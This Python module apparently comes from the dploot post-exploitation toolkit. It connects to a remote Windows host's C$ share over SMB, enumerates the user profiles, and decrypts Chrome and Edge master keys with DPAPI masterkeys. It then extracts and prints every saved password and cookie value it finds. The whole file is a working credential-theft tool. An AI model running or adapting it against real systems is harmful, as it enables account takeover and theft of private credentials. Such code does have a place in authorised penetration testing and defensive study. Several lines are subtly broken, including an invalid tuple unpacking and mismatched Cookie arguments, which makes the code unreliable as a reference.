import base64
import json
import logging
import ntpath
import tempfile
import sqlite3
from typing import List, Tuple
from dploot.lib.crypto import decrypt_chrome_password

from dploot.lib.dpapi import decrypt_blob, find_masterkey_for_blob
from dploot.lib.smb import DPLootSMBConnection
from dploot.lib.target import Target
from dploot.lib.utils import datetime_to_time
from dploot.triage.masterkeys import Masterkey

class LoginData:
    def __init__(self, winuser: str, browser:str, url:str, username:str, password:str):
        self.winuser = winuser
        self.browser = browser
        self.url = url
        self.username = username
        self.password = password

    def dump(self) -> None:
        print('[%s LOGIN DATA]' % self.browser.upper())
        print('URL:\t\t%s' % self.url)
        print('Username:\t%s' % self.username)
        if self.password is not None:
            print('Password:\t%s' % self.password)
        print()

class Cookie:
    def __init__(self, winuser: str, browser:str, host:str, path: str, cookie_name:str, cookie_value:str, creation_utc:str, expires_utc:str, last_access_utc:str):
        self.winuser = winuser
        self.browser = browser
        self.host = host
        self.path = path
        self.cookie_name = cookie_name
        self.cookie_value = cookie_value
        self.creation_utc = creation_utc
        self.expires_utc = expires_utc
        self.last_access_utc = last_access_utc

    def dump(self) -> None:
        print('[%s COOKIE DATA]' % self.browser.upper())
        print('Host (path):\t\t%s (%s)' % (self.host,self.path))
        print('Cookie Name:\t\t%s' % self.cookie_name)
        if self.cookie_value is not None:
            print('Cookie Value:\t\t%s' % self.cookie_value)
        print('Creation UTC:\t\t%s' % datetime_to_time(self.creation_utc))
        print('Expires UTC:\t\t%s' % datetime_to_time(self.expires_utc))
        print('Last Access UTC:\t%s' % datetime_to_time(self.last_access_utc))
        print()

class BrowserTriage:

    false_positive = ['.','..', 'desktop.ini','Public','Default','Default User','All Users']
    user_google_chrome_generic_login_path = {
        'aesStateKeyPath':'Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\Local State',
        'loginDataPath':'Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data',
        'cookiesDataPath':'Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies'
    }
    user_msedge_generic_login_path = {
        'aesStateKeyPath':'Users\\%s\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State',
        'loginDataPath':'Users\\%s\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data',
        'cookiesDataPath':'Users\\%s\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cookies'
    }
    user_generic_chrome_paths = {
        'google chrome':user_google_chrome_generic_login_path,
        'msedge':user_msedge_generic_login_path,
    }

    share = 'C$'

    def __init__(self, target: Target, conn: DPLootSMBConnection, masterkeys: List[Masterkey]) -> None:
        self.target = target
        self.conn = conn
        
        self._is_admin = None
        self._users = None
        self.looted_files = dict()
        self.masterkeys = masterkeys

    def triage_browsers(self) -> Tuple[List[LoginData], List[Cookie]]:
        credentials, cookies = list()

        for user in self.users:
            try:
                user_credentials, user_cookies=self.triage_browsers_for_user(user)
                credentials += user_credentials
                cookies += user_cookies
            except Exception as e:
                print(str(e))
                pass
        return credentials, cookies

    def triage_browsers_for_user(self, user: str) -> Tuple[List[LoginData], List[Cookie]]:
        return self.triage_chrome_browsers_for_user(user=user)

    def triage_chrome_browsers_for_user(self,user:str) -> Tuple[List[LoginData], List[Cookie]]:
        credentials, cookies = list()
        for browser,paths in self.user_generic_chrome_paths.items():
            aeskey = None
            aesStateKey_bytes = self.conn.readFile(shareName=self.share, path=paths['aesStateKeyPath'] % user)
            if aesStateKey_bytes is not None and len(aesStateKey_bytes) > 0:
                logging.debug('Found %s AppData files for user %s' % (browser.upper(), user))
                aesStateKey_json = json.loads(aesStateKey_bytes)
                blob = base64.b64decode(aesStateKey_json['os_crypt']['encrypted_key'])
                if blob[:5] == b'DPAPI':
                    dpapi_blob = blob[5:]
                    masterkey = find_masterkey_for_blob(dpapi_blob, masterkeys=self.masterkeys)
                    if masterkey is not None:
                        aeskey = decrypt_blob(blob_bytes=dpapi_blob, masterkey=masterkey)

            loginData_bytes = self.conn.readFile(shareName=self.share, path=paths['loginDataPath'] % user)
            if aeskey is not None and loginData_bytes is not None and len(loginData_bytes) > 0:
                fh = tempfile.NamedTemporaryFile()
                fh.write(loginData_bytes)
                fh.seek(0)
                db = sqlite3.connect(fh.name)
                cursor = db.cursor()
                query = cursor.execute(
                    'SELECT action_url, username_value, password_value FROM logins')
                lines = query.fetchall()
                if len(lines) > 0:
                    for url, username, encrypted_password in lines:
                        password = decrypt_chrome_password(encrypted_password, aeskey)
                        credentials.append(LoginData(
                            winuser=user, 
                            browser=browser, 
                            url=url, 
                            username=username, 
                            password=password))
                fh.close()


            cookiesData_bytes = self.conn.readFile(shareName=self.share, path=paths['cookiesDataPath'] % user)
            if aeskey is not None and cookiesData_bytes is not None and len(cookiesData_bytes) > 0:
                fh = tempfile.NamedTemporaryFile()
                fh.write(cookiesData_bytes)
                fh.seek(0)
                db = sqlite3.connect(fh.name)
                cursor = db.cursor()
                query = cursor.execute(
                    'SELECT creation_utc, host_key, name, path, expires_utc, last_access_utc, encrypted_value FROM cookies')
                lines = query.fetchall()
                if len(lines) > 0:
                    for creation_utc, host, name, path, expires_utc, last_access_utc, encrypted_cookie in lines:
                        cookie = decrypt_chrome_password(encrypted_cookie, aeskey)
                        cookies.append(Cookie(
                            winuser=user,
                            browser=browser,
                            host=host,
                            path=path,
                            name=name,
                            cookies=cookie,
                            creation_utc=creation_utc,
                            expires_utc=expires_utc,
                            last_access_utc=last_access_utc))
                fh.close()
        return credentials, cookies

    @property
    def is_admin(self) -> bool:
        if self._is_admin is not None:
            return self._is_admin

        self._is_admin = self.conn.is_admin()
        return self._is_admin

    @property
    def users(self) -> List[str]:
        if self._users is not None:
            return self._users
        
        users = list()

        users_dir_path = 'Users\\*'
        directories = self.conn.listPath(shareName=self.share, path=ntpath.normpath(users_dir_path))
        for d in directories:
            if d.get_longname() not in self.false_positive and d.is_directory() > 0:
                users.append(d.get_longname())
    
        self._users = users

        return self._users